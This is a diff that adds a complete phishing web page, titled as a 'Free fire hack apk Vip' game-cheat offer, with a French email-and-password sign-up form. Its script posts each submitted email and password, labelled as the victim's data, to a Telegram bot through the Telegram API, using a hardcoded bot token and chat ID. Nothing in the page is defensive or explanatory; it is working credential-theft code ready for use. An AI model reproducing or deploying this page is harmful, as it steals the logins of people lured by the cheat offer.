@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free fire hack apk Vip </title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    #myform {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+    }
+    button {
+      width: 95%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: block;
+      text-align: left;
+    }
+    .message {
+      color: green;
+      margin-top: 10px;
+      font-size: 0.9em;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <form id="myform">
+    <h2>SIGN-UP</h2>
+    <label for="mail">Email :</label>
+    <input type="email" id="mail" required>
+    <label for="mdp">Mot de passe :</label>
+    <input type="password" id="mdp" required>
+    <button type="submit">Se connecter</button>
+    <p class="message"></p>
+  </form>
+
+  <script>
+  alert("hi!! Welcome to free fire hackers please register to continue ✅")
+    const BOT_TOKEN = '8175527930:AAH0NpWeTS2IcwrSNebviaRM7QmotzvtmG4'; // Remplacez par le token de votre bot Telegram
+    const CHAT_ID = '7879061625';     // Remplacez par l'ID du chat Telegram
+
+    const myform = document.getElementById('myform');
+    const messageElement = document.querySelector('.message');
+
+    myform.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('mail').value;
+      const password = document.getElementById('mdp').value;
+
+      const message = `Données de la victime ✅ :\nEmail : ${email}\nMot de passe : ${password}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          messageElement.textContent = 'Données envoyées avec succès !';
+          messageElement.className = 'message';
+          myform.reset();
+        } else {
+          throw new Error('Erreur lors de l\'envoi');
+        }
+      } catch (error) {
+        messageElement.textContent = 'Une erreur est survenue.';
+        messageElement.className = 'message error';
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
